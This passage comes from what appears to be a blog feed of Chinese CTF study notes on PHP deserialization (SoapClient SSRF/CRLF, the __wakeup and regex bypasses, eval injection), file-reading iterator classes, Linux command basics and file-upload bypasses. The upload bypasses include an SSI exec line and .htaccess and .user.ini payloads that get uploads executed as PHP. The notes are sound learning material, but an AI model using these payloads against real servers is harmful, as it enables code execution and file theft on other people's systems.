alt="image-20220807151831343"></p><blockquote><p>值不相同（对象，异常代码不同）,md5和sha1的值相同（输出的是一样的）</p></blockquote><h3 id="极客大挑战-2020-Greatphp"><a href="#极客大挑战-2020-Greatphp" class="headerlink" title="[极客大挑战 2020]Greatphp"></a>[极客大挑战 2020]Greatphp</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )</span><br><span class="line">    </span><br><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br></pre></td></tr></table></figure><p>多了一个eval</p><p>只需要将payload构造为<code>?&gt;&lt;? payload?&gt;</code>的形式即可,前面的<code>?&gt;</code>把文件原来的<code>&lt;?php</code>闭合了。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>( <span class="meta">?&gt;</span>    <span class="meta">&lt;?php</span> payload <span class="meta">?&gt;</span>        )    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="SoapClient类"><a href="#SoapClient类" class="headerlink" title="SoapClient类"></a>SoapClient类</h2><blockquote><p>内置call方法，当call方法被调用时，就会发起http请求，可以伪造ssrf请求</p><p>并因为可以自定义user_agent请求头从而造成crlf漏洞。</p></blockquote><p>可能会出现的问题<a href="https://stackoverflow.com/questions/11391442/fatal-error-class-soapclient-not-found">Fatal error: Uncaught Error: Class ‘SoapClient’ not found in</a></p><blockquote><p>CRLF注入是一类注入漏洞。是“回车+换行”的简称，又叫做回车换行符。<br>表示为<code>\r\n</code>，编码之后是<code>%0d%0a</code>。这个在HTTP协议中表示消息头与消息体之间的分隔。</p><p>浏览器就是根据这两个CRLF来分离HTTPHeader与HTTPBody的。从而把HTTP内容显示出来。所以，如果我们能够控制HTTP消息头的字符，那么我们就能够注入一些恶意的换行。</p></blockquote><p>例子SoapClient::call方法发送soap请求,伪造post数据</p><p>在linux下执行</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://192.168.244.128:8888/&quot;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;data=abc&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,</span><br><span class="line"><span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">  <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;khaz^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,</span><br><span class="line">        <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;hello&#x27;</span>));</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$aaa</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Test</span></span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">notexists</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="../images/image-20221027114101336.png" alt="image-20221027114101336" style="zoom:67%;" /><p>因为我们设置了Content-length，那么读取了data&#x3D;abc后就会舍弃掉后面的数据</p><h2 id="文件操作类"><a href="#文件操作类" class="headerlink" title="文件操作类"></a>文件操作类</h2><p>注：FilesystemIterator 是DirectoryIterator的子类，所以可以将DirectoryIterator换为FilesystemIterator。</p><h4 id="遍历目录"><a href="#遍历目录" class="headerlink" title="遍历目录"></a>遍历目录</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;./&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$tmp</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$tmp</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="../images/image-20221128122840348.png" alt="image-20221128122840348" style="zoom:80%;" /><h4 id="查找文件"><a href="#查找文件" class="headerlink" title="查找文件"></a>查找文件</h4><ul><li><p>查找根目录的flag文件名</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="string">&quot;f*&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128123553510.png" alt="image-20221128123553510"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///f*&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/image-20221128123054538.png" alt="image-20221128123054538"></p><blockquote><p>​<strong>GlobIterator 类支持直接通过模式匹配来寻找文件路径</strong></p></blockquote><ul><li><p>确认文件路径</p><p>假设现在知道flag的文件名为flag，但不知道具体路径</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># 目录穿越</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob://../../../flag&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128123216008.png" alt="image-20221128123216008"></p><p>当输出flag时，说明路径是正确的。</p></li></ul><h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f1ag</span>=<span class="title function_ invoke__">implode</span>(<span class="keyword">array</span>(<span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/flag&#x27;</span>)));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$f1ag</span>);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128122206828.png" alt="image-20221128122206828"></p><h1 id="一些trick"><a href="#一些trick" class="headerlink" title="一些trick"></a>一些trick</h1><p><a href="https://pankas.top/2022/08/04/php(phar)%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#16%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87%E5%AD%97%E7%AC%A6%E7%9A%84%E8%BF%87%E6%BB%A4">php(phar)反序列化漏洞及各种绕过姿势</a></p><h2 id="GC机制绕过抛出异常"><a href="#GC机制绕过抛出异常" class="headerlink" title="GC机制绕过抛出异常"></a>GC机制绕过抛出异常</h2><blockquote><p>正常情况下抛出异常并且没有捕捉的话php是不会执行析构函数的</p><p>但在laravel这种框架里通常都有全局的错误处理与异常捕捉，显示通用的500或者错误页面。 只要异常被捕捉，后面的析构就会执行了。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="keyword">new</span> test, <span class="literal">null</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;i:1;N&#x27;</span>, <span class="string">&#x27;i:0;N&#x27;</span>, <span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><blockquote><p>因为<strong>反序列化的过程是顺序执行</strong>的，所以到第一个属性时，会将<code>Array[0]</code>设置为对象，同时我们又将<code>Array[0]</code>设置为<code>null</code>，这样前面的<code>test</code>对象便丢失了引用，就会被GC所捕获，就可以执行<code>__destruct</code>了</p></blockquote><h2 id="绕过正则"><a href="#绕过正则" class="headerlink" title="绕过正则"></a>绕过正则</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;nonono!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li><p>用+O代替O</p></li><li><p>用数组绕过</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure></li></ul><h2 id="绕过字符过滤"><a href="#绕过字符过滤" class="headerlink" title="绕过字符过滤"></a>绕过字符过滤</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/username/&#x27;</span>, <span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;nonono!!!&lt;/br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>序列字符串中<strong>表示字符类型的s大写时，会被当成16进制解析。</strong></p></blockquote><h2 id="绕过wake-up"><a href="#绕过wake-up" class="headerlink" title="绕过wake_up"></a>绕过wake_up</h2><ul><li><strong>php版本 PHP5&lt;5.6.25，PHP7 &lt; 7.0.10</strong></li></ul><p><strong>反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过<code>__wakeup( )</code>的执行。</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;fl4g.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span>= <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Demo</span>);</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$x</span>);<span class="comment">//绕过preg_match()</span></span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:3:&#x27;</span>,<span class="variable">$x</span>);<span class="comment">//绕过__wakeup()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="绕过特定变量赋值"><a href="#绕过特定变量赋值" class="headerlink" title="绕过特定变量赋值"></a>绕过特定变量赋值</h2><ul><li>引用变量</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span> = <span class="number">2</span>;</span><br><span class="line"><span class="variable">$a</span> = &amp;<span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b:&#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27;$a:&#x27;</span>.<span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b:&#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27;$a:&#x27;</span>.<span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> =<span class="number">2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b:&#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27;$a:&#x27;</span>.<span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221026153815014.png" alt="image-20221026153815014"></p><blockquote><p>在php里&amp;相当于两个变量都指向同一个地址，修改一个会影响到另一个。</p></blockquote><h2 id="通过可变函数调用类方法"><a href="#通过可变函数调用类方法" class="headerlink" title="通过可变函数调用类方法"></a>通过可变函数调用类方法</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello a\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;A::test&#x27;</span>; <span class="comment">// 调用 A 的 test 静态方法</span></span><br><span class="line"><span class="variable">$a</span>(); </span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = [<span class="keyword">new</span> <span class="title function_ invoke__">a</span>(), <span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>(); <span class="comment">// 调用 A 的 test 静态方法</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$a</span>); <span class="comment">// 调用 A 的 test 静态方法</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231026200915540.png" alt="image-20231026200915540"></p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux命令本质</title>
      <link href="/2023/05/31/%E5%91%BD%E4%BB%A4%E6%9C%AC%E8%B4%A8/"/>
      <url>/2023/05/31/%E5%91%BD%E4%BB%A4%E6%9C%AC%E8%B4%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="命令本质"><a href="#命令本质" class="headerlink" title="命令本质"></a>命令本质</h2><p>命令实际上就是具有一定功能的二进制文件</p><h2 id="命令位置"><a href="#命令位置" class="headerlink" title="命令位置"></a>命令位置</h2><p>&#x2F;bin,&#x2F;usr&#x2F;bin，默认都是全体用户使用</p><p>&#x2F;sbin,&#x2F;usr&#x2F;sbin,默认root用户使用</p><h2 id="执行过程"><a href="#执行过程" class="headerlink" title="执行过程"></a>执行过程</h2><p><img src="/../images/4dbf34717d434bb692683937feb52fea.png" alt="img"></p><h2 id="命令分类–外部和内建"><a href="#命令分类–外部和内建" class="headerlink" title="命令分类–外部和内建"></a>命令分类–外部和内建</h2><blockquote><p>内建命令实际上是shell程序的一部分，简单快速系统bash内置源码<br>比如：exit，history，cd，echo等。</p><p>外部命令是linux系统中的实用程序部分，外部命令的实体并不包含在shell中，但是其命令执行过程是由shell程序控制的。外部命令是在bash之外额外安装的，通常放在&#x2F;bin，&#x2F;usr&#x2F;bin，&#x2F;sbin，&#x2F;usr&#x2F;sbin等</p></blockquote><ul><li><p>查看外部命令存储位置</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220710194138135-1686283886642.png" alt="image-20220710194138135"></p><p>注：这里的PATH就是经常提到的环境变量</p><blockquote><p>当用户执行的是外部命令时，系统会在指定的多个路径中查找command的可执行文件，而定义这些路径的变量，就称为 PATH 环境变量，其作用就是告诉 Shell 待执行命令的可执行文件可能存放的位置，Shell 会在 PATH 变量包含的多个路径中逐个查找，直到找到为止（如果找不到，Shell 会提供用户“找不到此命令”）。</p></blockquote></li><li><p>判断命令是否为外部还是内建命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span> <span class="built_in">command</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# type cd</span><br><span class="line">cd is a shell builtin</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# type vim</span><br><span class="line">vim is /usr/bin/vim</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# type ps</span><br><span class="line">ps is hashed (/usr/bin/ps)</span><br></pre></td></tr></table></figure></li><li><p>区别</p><ul><li><p>外部命令</p><blockquote><p>当外部命令执行时，会创建出一个子进程。这种操作被称为衍生（forking）。外部命令ps很方便显示出它的父进程以及自己所对应的衍生子进程。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ps -f</span><br><span class="line">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class="line">root      8986  8984  0 17:17 pts/0    00:00:00 -bash</span><br><span class="line">root      9054  8986  0 17:53 pts/0    00:00:00 ps -f</span><br></pre></td></tr></table></figure><p>ps进程的PPID为-bash的PID。</p><p><img src="/../images/image-20220923175907599.png" alt="image-20220710194138135"></p></li><li><p>内建命令</p><blockquote><p>内建命令和外部命令的区别在于前者不需要使用子进程来执行。</p><p>因为既不需要通过衍生出子进程来执行，也不需要打开程序文件，内建命令的执行速度要更</p><p>快，效率也更高。</p></blockquote></li></ul></li><li><p>有些命令有多种实现方式</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# type -a cd</span><br><span class="line">cd is a shell builtin</span><br><span class="line">cd is /usr/bin/cd</span><br></pre></td></tr></table></figure><blockquote><p>对于有多种实现的命令，如果想要使用其外部命令实现，直接指明对应的文件就可以了。</p><p>例如，要使用外部命令pwd，可以输入&#x2F;bin&#x2F;pwd。</p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2023/05/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2023/05/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞危害–攻击面"><a href="#漏洞危害–攻击面" class="headerlink" title="漏洞危害–攻击面"></a>漏洞危害–攻击面</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Webshell类：脚本文件</span><br><span class="line">XSS类：svg，html，pdf文件,如果后端为nodejs，可以xss to rce</span><br><span class="line">XXE类：docx、xlsx，svg</span><br><span class="line">RCE类：phar文件，配合文件读取反序列化攻击 # 鸡肋，要有源码，还要有危险方法</span><br><span class="line">目录穿越：压缩包解压，文件路径可控  后果：文件覆盖，ssh公钥，计划任务，脚本文件上传到可执行web目录下....</span><br></pre></td></tr></table></figure><h1 id="PHP相关代码"><a href="#PHP相关代码" class="headerlink" title="PHP相关代码"></a>PHP相关代码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&#x27;xxx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [&#x27;file&#x27;]是Content-Disposition中name的值</span></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] 客户端文件名称</span><br><span class="line"></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] 文件的MIME类型       image/jpeg,image/png,application/octet-stream</span><br><span class="line"></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] 文件大小 单位字节</span><br><span class="line"></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>] 文件被上传后再服务器端临时文件名，可以在php.ini中指定</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 加入文件头绕过：GIF89a  </span></span><br><span class="line"><span class="title function_ invoke__">getimagesize</span>()  图片大小</span><br><span class="line"><span class="title function_ invoke__">exif_imagetype</span>()  图片类型</span><br></pre></td></tr></table></figure><p>上传过程</p><blockquote><p>在文件上传结束后，文件默认被储存在临时文件夹中，这时必须把他从临时目录中删除或移动到其他地方，否则，脚本运行完毕后，自动删除临时文件，可以使用<code>copy或</code>者<code>move_uploaded_file</code>两个函数。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]; <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">       <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h1><ul><li><p>中间件配置不当，导致可以解析其他脚本后缀</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># php</span></span><br><span class="line">.php3 .php4 .php5  .pht  .phtml  .phar  .shtml </span><br><span class="line">    </span><br><span class="line"><span class="comment"># .shtml    </span></span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;!--<span class="comment">#exec cmd=&quot;whoami&quot; --&gt;</span></span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">    </span><br><span class="line"><span class="comment"># jsp    </span></span><br><span class="line">.jsp .jspa .jsps .jspx </span><br><span class="line">    </span><br><span class="line"><span class="comment"># .net</span></span><br><span class="line">.asp  .asa .cdx  .cer  .aspx .asmx  .ashx</span><br></pre></td></tr></table></figure></li><li><p>可以上传相关配置文件</p><ul><li><p>.htaccess</p><p><a href="https://blog.csdn.net/solitudi/article/details/116666720">CTF.htaccess的使用技巧总结_.htaccess ctf_Y4tacker的博客-CSDN博客</a></p><p>只能用于Apache</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 当文件名中包含shell时，该文件会被Apache当作php解析</span></span><br><span class="line">&lt;FilesMatch &quot;shell&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#.png文件也可以执行php程序</span></span><br><span class="line">AddType application/x-httpd-php .png </span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启了cgi扩展：扩展名为.yyy的文件作为 CGI 脚本来处理</span></span><br><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .yyy</span><br></pre></td></tr></table></figure><p>修复</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在配置文件中将AllowOverride ALL改为AllowOverride None</span><br></pre></td></tr></table></figure></li><li><p>.user.ini</p><p>使用条件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache和Nginx都可以，只需满足：</span><br><span class="line">服务器脚本语言为PHP 服务器使用CGI</span><br><span class="line">FastCGI模式</span><br><span class="line">上传目录下要有可执行的php文件</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span>=file_name  <span class="comment">#表示在加载第一个PHP代码之前先行预加载该配置所指示的PHP文件。</span></span><br><span class="line"></span><br><span class="line"><span class="attr">auto_append_file</span>=file_name  <span class="comment">#表示在加载第一个PHP代码之后执行预加载该配置所指示的PHP文件。</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>过滤不当</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">点绕过、空格绕过、后缀双写绕过、后缀大小写绕过</span><br></pre></td></tr></table></figure></li><li><p>Apache解析漏洞</p><ul><li><p>从右往左解析漏洞</p><p>产生原因：</p><p>前提：<strong>php作为apache的一个子模块来运行</strong></p><p><img src="/../images/image-20230617172156170.png" 